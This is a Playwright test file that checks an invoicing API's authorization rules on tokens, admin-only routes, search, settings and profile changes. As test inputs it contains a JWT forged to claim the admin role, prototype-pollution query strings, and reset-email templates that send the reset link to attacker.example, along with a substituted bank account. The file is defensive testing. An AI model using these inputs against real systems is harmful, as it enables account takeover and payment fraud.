import { test, expect, type APIRequestContext } from '@playwright/test';
import { apiHeaders, apiUrl, getApiToken } from './helpers/api';
import { getRegularUser } from './helpers/login';

// Runs against the API with the E2E admin (E2E_USER) and a regular user (E2E_REGULAR_USER).
// Requests that would change data use ids that do not exist, so a broken check fails the test
// without deleting or changing a real account.
const missingId = 999999;

// Several tests change the regular user's profile, and one changes its password, so this
// file's tests run one after another instead of in parallel
test.describe.configure({ mode: 'default' });

type Method = 'get' | 'post' | 'put' | 'delete';

const call = (request: APIRequestContext, method: Method, path: string, token?: string) =>
    request[method](`${apiUrl}${path}`, {
        headers: apiHeaders(token),
        ...(method === 'get' ? {} : { data: {} }),
    });

// One route per protected router, plus the write routes that matter most
const protectedRoutes: [Method, string][] = [
    ['get', '/profile'],
    ['get', '/customers'],
    ['get', '/customer/1'],
    ['get', '/products'],
    ['get', '/product/1'],
    ['get', '/worksheets'],
    ['get', '/worksheet/1'],
    ['get', '/invoices'],
    ['get', '/invoice/last/'],
    ['get', '/search'],
    ['get', '/settings'],
    ['put', '/settings'],
    ['delete', '/settings'],
    ['post', '/email'],
    ['put', `/pdf/${missingId}`],
    ['get', '/users'],
    ['get', '/user/1'],
];

const adminOnlyRoutes: [Method, string][] = [
    ['get', '/users'],
    ['get', '/user/1'],
    ['post', '/user'],
    ['put', `/user/${missingId}`],
    ['delete', `/user/${missingId}`],
    ['delete', `/user/avatar/${missingId}`],
    ['put', '/settings'],
    ['delete', '/settings'],
];

test.describe('without a valid token', () => {
    for (const [method, path] of protectedRoutes) {
        test(`${method.toUpperCase()} ${path} needs a token`, async ({ request }) => {
            const response = await call(request, method, path);

            expect(response.status()).toBe(401);
            expect(await response.json()).toEqual({ success: false, message: 'auth.header' });
        });
    }

    test('a token that is not a JWT is refused', async ({ request }) => {
        const body = await (await call(request, 'get', '/users', 'not-a-jwt')).json();

        expect(body).toEqual({ success: false, message: 'invalid.token' });
    });

    test('a regular user cannot make themselves admin by editing the token', async ({
        request,
    }) => {
        const token = await getApiToken(request, getRegularUser());
        const [header, payload, signature] = token.split('.');
        const claims = JSON.parse(Buffer.from(payload, 'base64url').toString());
        const forgedPayload = Buffer.from(JSON.stringify({ ...claims, role: 'admin' })).toString(
            'base64url'
        );
        const forged = `${header}.${forgedPayload}.${signature}`;

        const body = await (await call(request, 'get', '/users', forged)).json();

        expect(body).toEqual({ success: false, message: 'invalid.token' });
    });
});

test.describe('admin-only routes', () => {
    for (const [method, path] of adminOnlyRoutes) {
        test(`${method.toUpperCase()} ${path} is forbidden for a regular user`, async ({
            request,
        }) => {
            const token = await getApiToken(request, getRegularUser());
            const response = await call(request, method, path, token);

            expect(response.status()).toBe(403);
            expect(await response.json()).toEqual({ success: false, message: 'forbidden' });
        });
    }

    test('an admin can list and read users', async ({ request }) => {
        const token = await getApiToken(request);

        const list = await (await call(request, 'get', '/users', token)).json();
        const single = await (await call(request, 'get', '/user/1', token)).json();

        expect(list.success).toBe(true);
        expect(list.resource.length).toBeGreaterThan(0);
        expect(single.success).toBe(true);
    });
});

test.describe('searching users', () => {
    // The user list is admin-only; the search must not be a way around that
    const search = (resource: string, keyword = '') =>
        `/search/?resource=${resource}&keyword=${encodeURIComponent(keyword)}&page=1&limit=10`;

    test('is forbidden for a regular user, with or without a keyword', async ({ request }) => {
        const token = await getApiToken(request, getRegularUser());

        for (const path of [
            search('users'),
            search('users', 'admin'),
            search('users', 'quantumdesk'),
            '/search/?resource=users',
        ]) {
            const response = await call(request, 'get', path, token);

            expect(response.status(), path).toBe(403);
            expect(await response.json(), path).toEqual({ success: false, message: 'forbidden' });
        }
    });

    test('cannot be reached by writing the resource differently', async ({ request }) => {
        const token = await getApiToken(request, getRegularUser());

        for (const path of [
            search('Users'),
            search('users%20'),
            '/search/?resource=customers&resource=users&page=1&limit=10',
            '/search/?resource[]=users&page=1&limit=10',
            '/search/?resource=constructor&page=1&limit=10',
            '/search/?resource=__proto__&page=1&limit=10',
        ]) {
            const body = await (await call(request, 'get', path, token)).json();

            expect(body.success, path).toBe(false);
            expect(body, path).not.toHaveProperty('resource');
        }
    });

    test('still works for a regular user on the other resources', async ({ request }) => {
        const token = await getApiToken(request, getRegularUser());

        for (const resource of ['customers', 'products', 'worksheets', 'invoices']) {
            const body = await (await call(request, 'get', search(resource), token)).json();

            expect(body.success, resource).toBe(true);
        }
    });

    test('an admin can search users', async ({ request }) => {
        const token = await getApiToken(request);
        const body = await (await call(request, 'get', search('users', 'cadet'), token)).json();

        expect(body.success).toBe(true);
        expect(body.resource.map((user: { username: string }) => user.username)).toContain(
            getRegularUser().username
        );
    });
});

test.describe('mail server settings', () => {
    const mailFields = ['host', 'port', 'username', 'password'];

    test('are not shown to a regular user', async ({ request }) => {
        const token = await getApiToken(request, getRegularUser());
        const body = await (await call(request, 'get', '/settings', token)).json();

        expect(body.success).toBe(true);
        for (const field of mailFields) {
            expect(body.data[0]).not.toHaveProperty(field);
        }
    });

    test('are shown to an admin, without the password', async ({ request }) => {
        const token = await getApiToken(request);
        const body = await (await call(request, 'get', '/settings', token)).json();

        expect(body.data[0]).toHaveProperty('host');
        expect(body.data[0]).not.toHaveProperty('password');
    });

    test('cannot be changed by a regular user', async ({ request }) => {
        const adminToken = await getApiToken(request);
        const userToken = await getApiToken(request, getRegularUser());
        const readHost = async () =>
            (await (await call(request, 'get', '/settings', adminToken)).json()).data[0].host;
        const hostBefore = await readHost();

        const response = await request.put(`${apiUrl}/settings`, {
            headers: apiHeaders(userToken),
            data: { host: 'smtp.attacker.example', username: 'attacker', password: 'x' },
        });

        expect(response.status()).toBe(403);
        expect(await readHost()).toBe(hostBefore);
    });
});

test.describe('settings', () => {
    const readSettings = async (request: APIRequestContext, token: string) =>
        (await (await call(request, 'get', '/settings', token)).json()).data[0];

    // The invoice counter moves whenever any invoice is created, also by tests running at the same
    // time, so a settings snapshot is compared without it
    const withoutCounter = ({ lastInvoiceId: _counter, ...settings }: Record<string, unknown>) =>
        settings;

    const putSettings = (request: APIRequestContext, token: string, data: object) =>
        request.put(`${apiUrl}/settings`, { headers: apiHeaders(token), data });

    // Changing any of these as a regular user would, in turn: put a reset link inside an
    // attacker's URL, divert invoice payments, or change the VAT and invoice numbering
    const attacks = {
        forgotHtml: '<img src="https://attacker.example/?t=[RESTORE_LINK]">',
        forgotText: 'https://attacker.example/?t=[RESTORE_LINK]',
        companyBankAccount: 'EE00 ATTACKER',
        companyBankAccount2: 'EE00 ATTACKER 2',
        vat: '0',
        lastInvoiceId: '1',
        invoiceFilenamePrefix: 'attacker_',
    };

    test('a regular user can read but not change them', async ({ request }) => {
        const adminToken = await getApiToken(request);
        const userToken = await getApiToken(request, getRegularUser());
        const before = await readSettings(request, adminToken);

        expect((await readSettings(request, userToken)).vat).toBe(before.vat);

        for (const [key, value] of Object.entries(attacks)) {
            const response = await putSettings(request, userToken, { [key]: value });

            expect(response.status(), `PUT ${key}`).toBe(403);
            expect(await response.json()).toEqual({ success: false, message: 'forbidden' });
        }

        expect(withoutCounter(await readSettings(request, adminToken))).toEqual(
            withoutCounter(before)
        );
    });

    test('a regular user cannot upload or remove the logo', async ({ request }) => {
        const adminToken = await getApiToken(request);
        const userToken = await getApiToken(request, getRegularUser());
        const before = await readSettings(request, adminToken);
        const png = Buffer.from(
            'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
            'base64'
        );

        const upload = await request.put(`${apiUrl}/settings`, {
            headers: apiHeaders(userToken),
            multipart: { logo: { name: 'logo.png', mimeType: 'image/png', buffer: png } },
        });
        const remove = await call(request, 'delete', '/settings', userToken);

        expect(upload.status()).toBe(403);
        expect(remove.status()).toBe(403);
        expect((await readSettings(request, adminToken)).logo).toBe(before.logo);
    });

    test('keys that are not settings are refused, and nothing is saved', async ({ request }) => {
        const token = await getApiToken(request);
        const before = await readSettings(request, token);

        for (const key of ['id', 'name', 'role', 'JWT_SECRET', 'notASetting']) {
            const response = await putSettings(request, token, {
                companyAddress2: 'should not be saved',
                [key]: 'x',
            });

            expect(await response.json(), key).toEqual({
                success: false,
                message: 'settingsInvalid',
            });
        }

        expect(withoutCounter(await readSettings(request, token))).toEqual(withoutCounter(before));
    });

    test('values that would break invoicing are refused', async ({ request }) => {
        const token = await getApiToken(request);
        const before = await readSettings(request, token);

        for (const data of [
            { vat: 'abc' },
            { vat: '124' },
            { lastInvoiceId: 'abc' },
            { lastInvoiceId: '-5' },
            { port: '99999' },
        ]) {
            expect(await (await putSettings(request, token, data)).json()).toEqual({
                success: false,
                message: 'settingsInvalid',
            });
        }

        expect(withoutCounter(await readSettings(request, token))).toEqual(withoutCounter(before));
    });

    test('an admin can still change them', async ({ request }) => {
        const token = await getApiToken(request);
        const before = (await readSettings(request, token)).companyAddress2;

        try {
            const response = await putSettings(request, token, {
                companyAddress2: `${before} (authorization test)`,
            });

            expect((await response.json()).success).toBe(true);
            expect((await readSettings(request, token)).companyAddress2).toBe(
                `${before} (authorization test)`
            );
        } finally {
            await putSettings(request, token, { companyAddress2: before });
        }

        expect((await readSettings(request, token)).companyAddress2).toBe(before);
    });
});

test.describe('profile', () => {
    test('an update always applies to the caller, never to an id in the body', async ({
        request,
    }) => {
        const adminToken = await getApiToken(request);
        const userToken = await getApiToken(request, getRegularUser());
        const readProfile = async () =>
            (await (await call(request, 'get', '/profile', userToken)).json()).resource;
        const readAdmin = async () =>
            (await (await call(request, 'get', '/user/1', adminToken)).json()).data[0];
        const userBefore = await readProfile();
        const adminBefore = await readAdmin();

        try {
            const response = await request.put(`${apiUrl}/profile`, {
                headers: apiHeaders(userToken),
                data: {
                    id: adminBefore.id,
                    name: `${userBefore.name} (authorization test)`,
                    email: userBefore.email,
                    role: 'admin',
                },
            });

            expect((await response.json()).success).toBe(true);

            const userAfter = await readProfile();
            const adminAfter = await readAdmin();

            expect(userAfter.name).toBe(`${userBefore.name} (authorization test)`);
            expect(userAfter.role).toBe('user');
            expect(adminAfter.name).toBe(adminBefore.name);
            expect(adminAfter.username).toBe(adminBefore.username);
        } finally {
            await request.put(`${apiUrl}/profile`, {
                headers: apiHeaders(userToken),
                data: { name: userBefore.name, email: userBefore.email },
            });
        }
    });
});

test.describe('profile email and password', () => {
    const putProfile = (request: APIRequestContext, token: string, data: object) =>
        request.put(`${apiUrl}/profile`, { headers: apiHeaders(token), data });

    test("a user cannot take another user's email", async ({ request }) => {
        const regular = getRegularUser();
        const userToken = await getApiToken(request, regular);
        const admin = (
            await (await call(request, 'get', '/profile', await getApiToken(request))).json()
        ).resource;
        const name = (await (await call(request, 'get', '/profile', userToken)).json()).resource
            .name;

        for (const email of [admin.email, admin.email.toUpperCase()]) {
            const response = await putProfile(request, userToken, {
                name,
                email,
                currentPassword: regular.password,
            });

            expect(await response.json()).toEqual({ success: false, message: 'user.exists' });
        }

        const after = (await (await call(request, 'get', '/profile', userToken)).json()).resource;

        expect(after.email).toBe(regular.username);
    });

    test('changing the email or password needs the current password', async ({ request }) => {
        const regular = getRegularUser();
        const token = await getApiToken(request, regular);
        const name = (await (await call(request, 'get', '/profile', token)).json()).resource.name;
        const attempts = [
            { name, email: 'someone-else@quantumdesk.example' },
            { name, email: regular.username, password: 'AnotherPassword1' },
            {
                name,
                email: regular.username,
                password: 'AnotherPassword1',
                currentPassword: 'wrong-password',
            },
        ];

        for (const data of attempts) {
            expect(await (await putProfile(request, token, data)).json()).toEqual({
                success: false,
                message: 'currentPassword',
            });
        }

        // The password did not change
        await getApiToken(request, regular);
    });

    test('a password change ends other sessions and returns a new token', async ({ request }) => {
        const regular = getRegularUser();
        const newPassword = `${regular.password}-changed`;
        const otherSession = await getApiToken(request, regular);
        const token = await getApiToken(request, regular);
        const name = (await (await call(request, 'get', '/profile', token)).json()).resource.name;
        let freshToken: string | undefined;

        try {
            const body = await (
                await putProfile(request, token, {
                    name,
                    email: regular.username,
                    password: newPassword,
                    currentPassword: regular.password,
                })
            ).json();

            expect(body.success).toBe(true);
            freshToken = body.token as string;

            for (const old of [token, otherSession]) {
                expect(await (await call(request, 'get', '/profile', old)).json()).toEqual({
                    success: false,
                    message: 'invalid.token',
                });
            }

            expect(
                (await (await call(request, 'get', '/profile', freshToken)).json()).success
            ).toBe(true);
        } finally {
            // Put the original password back, whichever step failed
            const restoreWith =
                freshToken ?? (await getApiToken(request, { ...regular, password: newPassword }));

            await putProfile(request, restoreWith, {
                name,
                email: regular.username,
                password: regular.password,
                currentPassword: newPassword,
            });
        }

        await getApiToken(request, regular);
    });
});
